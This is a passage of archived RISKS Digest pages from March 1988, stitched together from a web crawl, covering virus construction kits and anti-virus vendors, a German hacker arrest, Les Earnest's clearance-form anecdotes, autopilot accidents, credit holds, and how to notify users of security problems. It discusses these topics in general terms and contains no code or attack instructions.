CeBIT-report (March 21st, p.17) a contribution on a program, defined as `Virus
Construction Set', named `Nightmare Software', which may be used to construct
as well as to detect and delete viruses. The paper writes:

  `People offering the Virus Construction Set are themselves aware that they
  `play with the fire'.  Program and documentation is only allowed to be given
  to people older than 18 years, and any liability is strictly denied. People
  buying the software must also know that application of the `Nightmare
  Program' is punishable, with up to 5 years in prison. On the other hand, the
  software traders hope that the knowledge of the `Virus danger' may prevent
  the respective damage.'

Though a growing public awareness about `Vulnerability of Information
Society/Economy' should generally be welcomed, the last paragraph of the
respective article may produce a new mysticism which may even worsen public
awareness. After some sentences on Viruses, their detection and combat
(compared how to fight anthrax), the final paragraph follows:

  `Somehow, the use of medical vocabulary in the context of prosaic computer
  programs has a `human touch'. The `ordinary citizen' may think that a
  computer may become as ill as a living body. Moreover: one can defend oneself
  and fight the infection. On the other side one could say that here, Devil is
  expelled with Beelzebub.'

After past comparisons of computers and human brain (which is the unfortunate
inheritance of pioneers like Alan Turing and John von Neumann), unadequate
biological analogies (Viruses) may bring up another mysticism which may
prevent rational analysis of risks embedded in elementary computer concepts
as well as in ill-analysed application packages.
 

3. Revenge Threat of German Hackers:

After the imprisonment of a leading member of Computer Chaos Club (CCC) in
Paris, some German hackers may plan `revenge activities'. `Der SPIEGEL',
often well informed, cites a Munich hacker: `when I become really angry,
nothing may prevent me from heavily confusing their systems' (Der Spiegel,
Nr.12, March 21, p.109-111). It seems wise to accurately monitor the access
patterns of network-accessible installations.

As reported in RISK 6.44, one of the chairmen of (Hamburg-based) CCC, Mr.
Steffen Wernery, has been arrested by French police when arriving at Charles
de Gaulle airport for a discussion with Philips officials and a subsequent
lecture on `the NASA hack' at SECURICOM. In the meantime, the German Criminal
Office (Bundes-Kriminal-Amt, BKA), charged with prosecuting possible German
participants in the invasion of computers at NASA, CERN and Philips France,
said that CCC officials have not participated in the NASA coup. Evidently,
the French police had not been informed about this result.

The work of CCC is heavily influenced by consequences of the arrest,
including heavy differences among CCC officials.  Hamburg newspapers report
that all CCC money has been spent in extensive, uncoodinated telephone calls
between Hamburg and Paris.  Moreover, the remaining chairpersons denied Mr.
Wernery's wish to sell the story of his arrest for exclusive publication for
a high enough prize to cover his defence expenses: while his approach was
denied by Hamburg CCC managers, financial problems of Mr. Wernery and the CCC
are unsolved.


Klaus Brunnstein, University of Hamburg, Faculty for Informatics

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 The Anti-Virus Business, or, This Generation's Snake-Oil?
</A>
</H3>
<address>
&lt;<A HREF="mailto:TMPLee@DOCKMASTER.ARPA">
TMPLee@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 24 Mar 88 11:41 EST
</i><PRE>

From  the  24  March  1988  Minneapolis  Star  Tribune,  front  page of the
business section:

COMPUTER 'VIRUSES' CREATING ENTREPRENEURIAL OPPORTUNITY

Steve Gross [Technology editor]

Computer  'viruses'  are  creating  an  opportunity  for  firms marketing a
remedy in the form of anti-virus software.

A virus  is a tiny piece of software designed by a programmer who typically
seeks  to  damage  someone's  computer  data, usually at some predetermined
future  date.  Often the virus is planted in free computer programs offered
on  national  computer  bulletin  boards available to anyone whose personal
computer can receive data by telephone.

Once the  'infected' program is received from the bulletin board, its virus
begins to  replicate itself  like a biological virus.  Each duplicate virus
infects other  programs and  data stored  on the computer's floppy and hard
disks, erasing  all or  part of  the infected  material when the computer's
internal  clock  reaches  the  predetermined  set-off date.  If people have
made  back-up  copies  of  their  programs  and files, those disks also are
infected and will undergo the same disaster when used.

Viruses  have gotten  a lot  of publicity  lately.  Three weeks ago the New
York Times  reported that  computer viruses could become "a science-fiction
nightmare come  to life"  as they move unseen from one personal computer to
another across  telephone lines or within office computer networks.  In the
past few  months, people who run computer bulletin boards, corporations and
even  the  government  of  Israel  have  reported  viruses  infecting their
software.

"The biggest  source (of viruses) has been contaminated files from computer
bulletin  boards,"  said  David  Buerger, director of the Personal Computer
Center at  Santa Clara University in California, in an interview this week.
In addition,  some university students "have been infecting software in the
computer labs."

These  infections  represent  "a  real  opportunity"  for companies writing
anti-virus  software,  Buerger  said.   While the anti-virus programs can't
eliminate all  infections, they can force virus-writers "to be more clever.
They'll have to invest more time and effort.

"It's like  locking the  car when  you park  in a  high-crime district.  It
will stop  the kids  and the ones who want to take a joy ride.  But if it's
a professional thief .. the best system won't keep him out of he car."

Lloyd Tabb,  a software  writer for Sophco Inc., in Boulder, Colo. said his
firm markets  Protec, a $195 virus-detection program that includes features
called  Syringe  and  Canary.    Syringe  injects  a  harmless virus into a
program that  checks to  make sure  no harmful viruses are present.  Canary

is a  program that  waits for  a virus  and stops functioning if it becomes
infected, much  like the  real canaries  carried by old-time miners to warn
them of poisonous gases.

Ron  Sturtevant-Stuart,  president  of  Asky,  Inc.,  a  software  firm  in
Milpitas,  Calif.,  said  his  Softlog  program matches the current size of
computer  files  against  their  previous  size  to check for viruses.  The
program is licensed to corporations in lots of 100 units for $2,400.

Eric  Hansen,  a  vice  president  of  Fridley-based [a Minneapolis suburb]
Digital  Dispatch Inc.,  has been quoted in the New York Times and computer
industry trade  publications as  a result of the firm's $199 Data Physician
program, which detects and in some cases eliminates viruses.

Hansen said  viruses have  been talked  about for years, but are becoming a
problem now  because "there  are a  lot more  personal computers out there.
As  more  computers  move  into  more  people's hands, more persons of evil
intent are  going to have computer skills.  It really only takes one person
nationwide writing  one of  these things  and plunking  it up on a bulletin
board to cause enormous havoc."

The Data  Physician program, which has been marketed for three years, makes
careful measurements  of a computer's programs and data files to detect any
"alien" computer  codes, he  said.  One portion of the program, called Data
MD, creates  a list  of computer  data files  to be  protected, and watches
them  while  the  computer  is  in  operation.  Another part called Antigen
attaches  itself  to  an  individual  computer  program  and  checks it for
viruses each  time it is used.  To remove a virus, Antigen erases the bytes
of  computer  data  that  weren't  in  a program earlier, he said.  A third
portion  of  the  program,  called  Padlock,  prevents  anything from being
written  on a  storage disk unless the computer operator pushes a button to
give permission.

However,  Hansen  said,  "there  is  a  way  around absolutely everything."
Viruses  can  be  tailored  to  escape  detection  by  specific  anti-virus
program's  he said.   To prevent that, "you have to continually change your
product so  a virus  can't go  after it."   His  firm is  already trying to
develop a  foolproof version of Data Physician that couldn't be disabled by
a virus before the program had a chance to act, he said.

However,  anti-virus  software  makers  have  one advantage in the war with
virus inventors:  viruses can't be made too complicated.

For  example, a virus that could evade several types of anti-virus programs
would have  to consist  of a  longer and  more elaborate  piece of computer
code than  a non-evasive  virus, Hansen  said.   But, he added, "if you put
enough intelligence  into a  virus to beat every protection scheme, it will
get too fat and slow and be detected."

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.48.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.50.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-85</DOCNO>
<DOCOLDNO>IA012-000129-B044-130</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.50.html 128.240.150.127 19970217020305 text/html 34702
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:01:32 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 50</TITLE>
<LINK REL="Prev" HREF="/Risks/6.49.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.51.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.49.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.51.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 50</H1>
<H2>  Monday 28 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Short stories of old computer risks 
</A>
<DD>
<A HREF="#subj1.1">
Les Earnest
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  NY TIMES on risks of cockpit automation 
</A>
<DD>
<A HREF="#subj2.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Credit-limit handling found overly restrictive 
</A>
<DD>
<A HREF="#subj3.1">
Wayne H. Badger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Decomposing checks 
</A>
<DD>
<A HREF="#subj4.1">
David Rogers
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Notifying users of security problems 
</A>
<DD>
<A HREF="#subj5.1">
Andy Goldstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Entrepreneurial Viruses 
</A>
<DD>
<A HREF="#subj6.1">
Chuck Weinstock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Early viruses 
</A>
<DD>
<A HREF="#subj7.1">
Sayed A. Banawan
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Person-in-the-Loop Amendment Signed into Law 
</A>
<DD>
<A HREF="#subj8.1">
Fred Baube
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Short stories of old computer risks
</A>
</H3>
<address>
Les Earnest 
&lt;<A HREF="mailto:LES@SAIL.Stanford.EDU">
LES@SAIL.Stanford.EDU
</A>&gt;
</address>
<i>
28 Mar 88  1641 PST
</i><PRE>

Tired of viruses?  I was just purging some old files and ran across a
trilogy of true short stories that I posted on the Stanford bboards two
years ago.  The incidents described span a period of twenty years ending 25
years ago, but I think they are still amusingly relevant.  


Kick the Mongrel   

In a previous account I told how reading a book on cryptography led to my
getting an F.B.I. record at the age of 12 and about subsequent awkwardness in
obtaining a security clearance.  I will now describe how I learned that putting
provocative information on a security clearance form can accelerate the
clearance process.  First let me describe the environment that gave rise to
this occurrence.

			White Faces in New Places

In 1963, after living in Lexington, Massachusetts for 7 years, my wife and I
moved to the Washington D.C. area to help set up a new office for Mitre
Corporation.  After three days of searching, we bought a house then under
construction in a pleasant new suburb called Mantua Hills, near Fairfax,
Virginia.  I hadn't noticed it during our search, but it soon became evident
that there were nothing but white faces in this area.  In fact, there were
nothing but white faces for miles around.

We expected to find some cultural differences and did.  For example, people
drove much less aggressively than in Boston.  The first time that I did a
Boston-style bluff at a traffic circle, the other cars yielded! This took all
the fun out of it and I was embarrassed into driving more conservatively.

When I applied for a Virginia driver's license, I noticed that the second
question on the application, just after "Name," was "Race."  When filling out
forms, I have always made it a practice to omit information that I think is
irrelevant.  It seemed to me that my race had nothing to do with driving a car,
so I left it blank.

When I handed the application to the clerk along with the fee, he just looked
at me, marked "W" in the blank field and threw it on a stack.  I guess that he
had learned that this was the easiest way to deal with outlanders.

Our contractor was a bit slow in finishing the house.  We knew that there was
mail headed our way that was probably accumulating in the post office, so we
put up the mailbox even before the house was finished.  The first day we got
just two letters -- from the American Civil Liberties Union and Martin Luther
King's organization.  We figured that this was the Post Office staff's way of
letting us know that they were on to us.  Sure enough, the next day we got the
rest of our accumulated mail, a large stack.

It shortly became apparent that on all forms in Virginia, the second question
was "Race."  Someone informed me that as far as the Commonwealth of Virginia
was concerned, there were just two races: "white" and "colored."  When our kids
brought forms home from school, I started putting a "C" after the second
question, leaving it to the authorities to figure out whether that meant
"Colored" or "Caucasian."

			Racing Clearance

About this time, my boss and I and another colleague applied for a special
security clearance that we needed.  There are certain clearances that can't be
named in public -- it was one of those.  I had held an ordinary Top Secret
clearance for a number of years and had held the un-namable clearance a short
time before, so I did not anticipate any problems.

When I filled out the security form, I noticed that question #5 was "Race."  In
the past I had not paid attention to this question; I had always thoughtlessly
written "Caucasian."  Having been sensitized by my new environment, I
re-examined the question.

All of my known forebears came from Europe, mostly from Southern Germany with a
few from England, Ireland, and Scotland.  A glance in the mirror, however,
indicated that there was Middle Eastern blood in my veins.  I have a semitic
nose and skin that tans so easily that I am often darker than many people who
pass for black.  Did I inherit this from a Hebrew, an Arab, a Gypsy or perhaps
one of the Turks who periodically pillaged Central Europe?  Maybe it was from a
Blackfoot Indian that an imaginative aunt thinks was in our family tree.  I
will probably never know.

As an arrogant young computer scientist, I believed that if there is any
decision that you can't figure out how to program, the question is wrong.  I
couldn't figure out how to program racial classification, so I concluded that
there isn't such a thing.  I subsequently reviewed some scientific literature
that confirmed this belief.  "Race" is, at best, a fuzzy concept about typical
physical properties of certain populations.  At worst, of course, it is used to
justify more contemptible behavior than any concept other than religion.

In answer to the race question on the security form, I decided to put
"mongrel."  This seemed like an appropriate answer to a meaningless question.

Shortly after I handed in the form, I received a call from a secretary in the
security office of the Defense Communications Agency.  She said that she had
noticed a typographical error in the fifth question where it said "mongrel."
She asked if I didn't mean "Mongol."  "No thanks," I said, "I really meant
`mongrel.'"  She ended the conversation rather quickly.

A few hours later I received a call from the chief security officer of D.C.A.,
who I happened to know.  "Hey, Les," he said in a friendly way, "I'd like to
talk to you the next time you're over here."  I agreed to meet him the
following week.

When I got there, he tried to talk me out of answering the race question
"incorrectly."  I asked him what he thought was the right answer.  "You know,
Caucasian," he replied.  "Oh, you mean someone from the Caucusus Mountains of
the U.S.S.R.?" I asked pointedly.  "No, you know, `white.'"  "Actually, I don't
know," I said.

We got into a lengthy discussion in which he informed me that as far as the
Defense Department was concerned there were five races:  Caucasian, Negro,
Oriental, American Indian, and something else that I don't remember.  I asked
him how he would classify someone who was, by his definition, 7/8 Caucasian and
1/8 Negro.  He said he wasn't sure.  I asked how he classified Egyptians and
Ethiopians.  He wasn't sure.

I said that I wasn't sure either and that "mongrel" seemed like the best answer
for me.  He finally agreed to forward my form to the security authorities but
warned that I was asking for trouble.

			A Question of Stability

I knew what to expect from a security background investigation: neighbors and
former acquaintances let you know it is going on by asking "What are they
trying to get you for?" and kidding you about what they told the investigators.
Within a week after my application for the new clearance was submitted, it
became apparent that the investigation was already underway and that the agents
were hammering everyone they talked to about my "mental stability."

The personnel manager where I worked was interviewed quite early and came to me
saying "My God! They think you're crazy! What did you do, rape a polo pony?"
He also remarked that they had asked him if he knew me socially and that he had
answered "Yes, we just celebrated Guy Fawkes Day together."  When the
investigator wanted to know "What is Guy Fawkes Day?"  he started to explain
the gunpowder plot but thought better of it.  He settled for the explanation
that "It's a British holiday."

An artist friend named Linda, who lived two houses away from us, said that she
had no trouble answering the investigator's questions about my stability.  She
said that she recalled our party the week before when we had formed two teams
to "Walk the plank."  In this game, participants take turns walking the length
of a 2 x 4 set on edge and drinking a small amount of beer.  Anyone who steps
off is eliminated and the team with the most total crossings after some number
of rounds wins.  Linda said that she remembered I was one of the most stable
participants.

I was glad that she had not remembered my instability at an earlier party of
hers when I had fallen off a skateboard, broken my watch and bruised my ribs.
The embarrassing cause of the accident was that I had run over the bottom of my
own toga!

The investigation continued full tilt everywhere I had lived.  After about
three months it stopped and a month later I was suddenly informed that the
clearance had been granted.  The other two people whose investigations were
begun at the same time did not receive their clearances until several months
later.

In comparing notes, it appeared that the investigators did the background
checks on my colleagues in a much more leisurely manner.  We concluded that my
application had received priority treatment.  The investigators had done their
best to pin something on me and, having failed, gave me the clearance.

The lesson was clear:  if you want a clearance in a hurry, put something on
your history form that will make the investigators suspicious but that is not
damning.  They get so many dull backgrounds to check that they relish the
possibility of actually nailing someone.  By being a bit provocative, you draw
priority attention and quicker service.

After I received the clearance, I expected no further effects from my
provocative answer.  As it turned out, there was an unexpected repercussion a
year later and an unexpected victory the year after that.  But that is another
story.
                                   Les Earnest

  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -  -

The Missed Punch   

An earlier account described how I came to list my race as "mongrel" on a
security clearance application and how the clearance was granted in an
unusually short time.  I will now describe a subsequent repercussion
that was a byproduct of a new computer application.

			Mongrel in a Star-chamber

In early 1965, about a year after I had been granted a supplementary security
clearance, I received a certified letter directing me to report to the Air
Force Office of Special Investigations at Suitland, Maryland very early in the
morning on a certain day four weeks later.  To one whose brain seldom functions
before 10am, this was a singularly unappealing trip request.

My wife somehow got me up early on the appointed day and I drove off in my TR-3
with the top down, as usual, even though it was a cold winter morning.  I hoped
that the air would stimulate my transition to an awakened state.

When I arrived and identified myself, I was immediately ushered into a long
narrow room with venetian blinds on one side turned to block the meager morning
light.  I was seated on one side of a table on which there were two goose-neck
lamps directed into my eyes.  There was no other light in the room, so I could
barely see the three inquisitors who took positions on the opposite side of the
table.

Someone punched on a tape recorder and the trio began taking turns at poking
into my past.  They appeared to be trying to convince me that I was in deep
trouble.  While the pace and tone of their questions were clearly aimed at
intimidation, they showed surprisingly little interest in my answers.  I
managed to stay relaxed, partly because I was not yet fully awake.

They asked whether I had any association with a certain professor at San Diego
State College, which I had attended for one year.  I recognized his name as
being one who was harassed as an alleged Communist sympathizer by the House
Un-American Activities Committee during the McCarthy Era.

Responding to the interrogator's question, I answered that I did not know him
but that I might have met him socially since he and my mother were on the
faculty concurrently.  They wanted to know with certainty whether I had taken
any classes from him.  I said that I had not.

They next wanted to know how well I knew Linus Pauling, who they knew was a
professor at Caltech when I was a student there.  I acknowledged that he was my
freshman chemistry professor and that I had visited his home once.  (I did not
mention that Pauling's lectures had so inspired me that I decided to become a
chemist.  It was not until I took a sophomore course in physical chemistry that
I realized that chemistry wasn't as much fun as I had thought.  After that, I
switched majors in rapid succession to Geology, Civil Engineering, then
Electrical Engineering.  I ended up working in a still different field.)

I recalled that Pauling had been regularly harassed by certain government
agencies during the McCarthy Era because of his leftist "peacenik" views.  He
was barred from overseas travel on occasion and the harassment continued even
after he won his first Nobel Prize but seemed to diminish after the second one,
the peace prize.

The inquisitors next wanted to know how often I got together with one of my
uncles.  I acknowledged that we met occasionally, the last time being a few
months earlier when our families dined together.  It sounded as though they
thought they had something on him.  I knew him to be a very able person with a
distinguished career in public service.  He had been City Manager of Ft.
Lauderdale and several other cities and had held a number of diplomatic posts
with the State Department.  It occurred to me that they might be planning to
nail him for associating with a known mongrel.

The questions continued in this vein for hours without a break.  I kept waiting
for them to bring up a Caltech acquaintance named Bernon Mitchell, who had
lived in the same student house as me.  Mitchell had later taken a position at
the National Security Agency, working in cryptography, then defected to the
Soviet Union with a fellow employee.  They were apparently closet gays.

In fact, the inquisitors never mentioned Mitchell.  This suggested that they
may not have done a very thorough investigation.  A more likely explanation was
that Mitchell and his boyfriend represented a serious failure of the security
clearance establishment -- one that they would rather not talk about.

After about three and a half hours of nonstop questioning I was beginning to
wake up.  I was also beginning to get pissed off over their seemingly endless
fishing expedition.  At this point there was a short pause and a rustling of
papers.  I sensed that they were finally getting around to the main course.

"We note that on your history form you claim to be a mongrel," said the man in
the middle.  "What makes you think you are a mongrel?"  "That seems to be the
best available answer to an ill-defined question," I responded.  We began an
exchange that was very much like my earlier discussion with the security
officer in the Defense Communications Agency.  As before, I asked how they
identified various racial groups and how they classified people who were
mixtures of these "races."

The interrogators seemed to be taken aback at my asking them questions.  They
asked why I was trying to make trouble.  I asked them why they would not answer
my questions.  When no answers were forthcoming, I finally pointed out that "It
is clear that you do not know how to determine the race of any given person, so
it is unreasonable for you to expect me to.  I would now like to know what you
want from me."

The interrogators began whispering among themselves.  They had apparently
planned to force me to admit my true race and were not prepared for an
alternative outcome.  Finally, the man in the center spoke up saying, "Are you
willing to sign a sworn statement about your race?"  "Certainly," I said.  They
then turned up the lights and called for a secretary.

She appeared with notebook in hand and I dictated a statement: "I declare that
to the best of my knowledge I am a mongrel."  "Don't you think you should say
more than that," said the chief interrogator.  "I think that covers it," I
replied.  The secretary shrugged and went off to type the statement.

			Punch Line

With the main business out of the way, things lightened up -- literally.  They
opened the venetian blinds to let in some sunlight and offered me a cup of
coffee, which I accepted.  We had some friendly conversation, then I signed the
typed statement, which was duly notarized.

My former tormentors now seemed slightly apologetic about the whole affair.  I
asked them what had prompted this investigation.  After some glances back and
forth, one of them admitted that "We were putting our clearance data base on
punched cards and found that there was no punch for `mongrel'."

I thought about this for a moment, then asked "Why didn't you add a new punch?"
"We don't have any programmers here" was the answer.  "We got the program from
another agency."

I said, "Surely I am not the only person to give a non-standard answer.  With
all the civil rights activists now in government service, some of them must
have at least refused to answer the race question."  The atmosphere became
noticeably chillier as one of them answered, with clinched teeth, "You're the
only one.  The rest of those people seem to know their race."

It was clear that they believed I had caused this problem, but it appeared to
me that the entire thrash was triggered by the combination of a stupid question
and the common programmer's blunder of creating a categorization that does not
include "Other" as an option.

The security people apparently found it impractical to obtain the hour or two
of a programmer's time that would have been needed to fix the code to deal with
my case, so they chose instead to work with their standard tools.  This led to
an expenditure of hundreds of man-hours of effort in gathering information to
try to intimidate me into changing my answer.

I was surprised to learn that nearly everyone believed in the mythical concept
of racial classification.  It appeared that even people who were victims of
discrimination acknowledged their classification as part of their identity.

I never did find out how the security investigators coped with the fact that I
remained a mongrel, but in 1966 I discovered that something very good had
happened: the "race" question had disappeared from the security clearance form.
I liked to think that I helped that change along.

Unfortunately, almost the same question reappeared on that form and most other
personnel forms a few years later, under the guise of "ethnic" classification.
I believe that that question is just as meaningless as the race question and I
have consistently answered it the same way during the intervening 20 years.

I now invite others to join me in this self-declassification, with the hope and
expectation that one day the bureaucrats and politicians will be forced to quit
playing with this issue and will come to realize that the United States of
America is a nation of egalitarian mongrels.  I believe that we will all be
better off.

In any case, whenever you design a database, please don't forget the "other"
category.
                              	Les Earnest

     [A Shaggy Database Story, for a change.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
NY TIMES on risks of cockpit automation
</A>
</H3>
<address>
Jon Jacky
&lt;<A HREF="mailto:jon@june.cs.washington.edu ">
jon@june.cs.washington.edu 
</A>&gt;
</address>
<i>
Mon, 28 Mar 88 09:45:52 PST
</i><PRE>

The cover story of the March 27, 1988 NEW YORK TIMES MAGAZINE is "Trouble in
the Cockpit: The Airlines Tackle Pilot Error," by William Stockton.  The 
story relates several incidents in which over-reliance on autopilots is
thought to have contributed to accidents or near-accidents:

"Last July 8, the crew in a Delta Airlines L-1011 en route to the US from
Europe strayed 60 miles off course and came within 100 feet of colliding
with a Continental Airlines 747.  The consensus among safety experts
is that the Delta pilots entered the wrong data in a computer navigation
system and then failed to frequently verify their position by other means."

"(Three years ago) a China Airlines 747 ... went out of control and fell
30,000 feet in less than two minutes,  upside down much of the time ...
(First) the outboard engine on the right wing ... quit.  The loss of the
engine cause the airplane to try to turn to the right. (The autopilot
tried to compensate, turning the plane to the left).  With his attention
focused, inappropriately, almost exclusively on the engine problem, the
captain failed... to realize that the airplane and the autopilot had become
engaged in a tug-of-war ... The captain was entirely oblivious to it because
he was letting the autopilot fly and did not actually have his hands on the
control wheel ... Finally, he disconnected the autopilot and took hold of the
control wheel to fly the plane himself.  In that instant, the plane
immediately won the tug of war with the autopilot .. The 747 rolled 
dramatically to the right (The pilot apparently did not immediately 
understand what was happening and did not compensate appropriately) and 
within a few seconds the 747 was on its back, plummeting earthward.
"If he had just turned the autopilot off when the engine problem first
developed, none of it would have happened," says (a human factors expert).

"In 1972, an Eastern Airlines L-1011 crashed in the Florida Everglades
killing 100 people.  When a light that indicates whether the landing gear
are up or down did not illuminate, all three pilots in the cockpit became
engrossed in the problem, which turned out to be a faulty light bulb.  The
tape recording of the cockpit conversation revealed that no one had noticed
that the autopilot had been inadvertantly disengaged and the airplane had
begun a gradual descent which finally led to its crashing"

The article cites recent human factors research that reveals crews often
handle sudden catastrophes better than a series of small nuisance incidents
which gradually builds into a disaster.

- Jon Jacky, University of Washington

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Credit-limit handling found overly restrictive
</A>
</H3>
<address>
&lt;<A HREF="mailto:LENOIL@XX.LCS.MIT.EDU">
LENOIL@XX.LCS.MIT.EDU
</A>&gt;
</address>
<i>
Mon, 28 Mar 1988  19:06 EST
</i><PRE>

I called my Mastercard bank and they informed me that authorizations remain in
effect for 10 days if not removed.  Authorizations can be removed in two ways:

    1.  If a bill comes in for the exact amount of the authorization
	on the same day, the authorization will be replaced with the bill.

    2.  A company can remove the authorization by arrangements through
	their bank in what is apparently a difficult procedure.

This sounds totally bogus.  Whenever a merchant calls for authorization, (s)he
is given an authorization number and writes that number on the charge slip.  I
assume that the number is used to remove the associated hold, which is then
replaced with the actual charge.  If your bank doesn't work this way, you
should switch to one that does. (I've never had a problem with my Citibank
MasterCard, so I don't think the problem is endemic to MasterCards.)

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Decomposing checks
</A>
</H3>
<address>
David Rogers 
&lt;<A HREF="mailto:drogers@riacs.edu">
drogers@riacs.edu
</A>&gt;
</address>
<i>
Mon, 28 Mar 88 13:16:42 PST
</i><PRE>

Actually, the reason the scheme worked is more subtle that PGN mentioned (the
national news got this wrong, also).  When you deposit a check, the money is
automatically deposited in your account, but a `hold' for that amount is also
placed on your account.  If the bank does *not* receive a notice that the check
bounced in 5 days, the hold expires, and the money can be removed.  There is no
rush to get the money out, since the decomposed check cannot be traced back to
the original account.

Because this scheme requires a knowledge of bank's procedures for depositing
checks, they think this was an inside job, done by someone who works or worked
at a bank.

David Rogers     &lt;Also noted by Bob Frankston&gt;

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Notifying users of security problems
</A>
</H3>
<address>
Andy Goldstein
&lt;<A HREF="mailto:goldstein%star.DEC@decwrl.dec.com ">
goldstein%star.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Mon, 28 Mar 88 08:28:40 PST
</i><PRE>

Klaus Brunnstein, University of Hamburg, Faculty for Informatics writes:
&gt; Surprisingly fast, Apple Germany found out about the MacInVirus and informed
&gt; it's users by email with the following text (cited without permission):
&gt;   `A product manager in Apple Germany, Kurt Bierbaum (BIERBAUM1) has found a
&gt;   disk in Germany which destroys hard disks and the applications that run on
&gt;   them. [...]
&gt; With this rather quick information, Apple reacted much faster than DEC did
&gt; in 1987 when the missing CLOSE in the password control routine in it's VMS
&gt; 4.4/4.5 versions was detected, [...]

I would be more impressed with this comparison if Apple had

(1) Notified all Mac users worldwide of this problem, and

(2) included with the notification machine readable copy an anti-virus
    which one could install to defeat the virus.

This would be more equivalent to what DEC did regarding the V4.4/V4/5 bug. I do
not know exactly what form of "email" Mr. Brunnstein refers to in his message,
but for the sake of argument I will presume it to mean the various networks
that join most academic and research institutions. For DEC, at least, such
networks reach only a small percentage of its customer base. Sending out notice
of a security problem to a subset of one's user base, even if the notice
includes a correction for the problem, does a great disservice to the remaining
users. (Sending out notice of the presence of a bug without a correction or
workaround is of course even more irresponsible.)

A virus is most harmful when users are unaware of it (and thus take no
precautions to prevent its spread). The seriousness of a security bug, on the
other hand, is directly proportional to how far knowledge of the bug has
propagated, because knowledge of the bug is what permits an attacker to exploit
it. By informing a subset of one's user community, one spreads knowledge of the
bug and thus raises the exposure to attack of the remaining users who are not
yet so informed.  For example, circumstantial evidence suggests that
publication of the patch for the V4.4/V4.5 bug in INFO-VAX may have been the
means by which the CCC learned of the bug's existence. Only when all computer
installations in the world are offered access at reasonable terms to ARPAnet,
Bitnet, or their siblings will I be convinced that such electronic distribution
is a fair and viable means of informing users about security problems. In the
meantime, DEC must use its own means to reach all its users.

I do not for a moment mean to imply that DEC's response in 1987 is the best
that we can do. A number of mishaps of the sort that tend to befall large
